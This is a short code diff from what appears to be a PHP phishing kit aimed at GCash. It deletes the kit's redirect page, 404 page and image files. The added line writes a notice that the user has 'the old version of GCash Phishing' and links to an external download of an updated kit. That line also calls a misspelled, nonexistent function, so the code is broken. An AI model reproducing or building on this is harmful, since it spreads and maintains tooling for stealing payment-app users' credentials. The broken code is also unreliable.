@@ -12,3 +12,4 @@ unlink('redir.php');
 unlink('404.php');
 unlink('*.png');
 unlink('*.jpg');
+file_puts_content("update.txt", "You are using the old version of GCash Phishing.\nYou can find the updated version here: https://anonfiles.com/59984925u7/GCash_zip");
